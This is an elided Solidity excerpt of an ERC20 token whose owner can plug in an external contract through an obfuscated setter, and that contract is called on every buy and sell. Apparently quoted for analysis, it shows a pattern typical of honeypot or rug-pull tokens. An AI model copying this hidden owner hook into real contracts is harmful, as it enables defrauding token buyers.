...
contract TokenM is ERC20 {
    ...
    IUserAmountotoule public otoule;
    ...
    function rssutaCobencHerec(IUserAmountotoule _otoule) public onlyOwner {
        otoule = _otoule;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                otoule.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				otoule.addOutAmount(from, amount);
            }else{
                otoule.addOutAmount(from, amount);
                takeFee = false;
            }
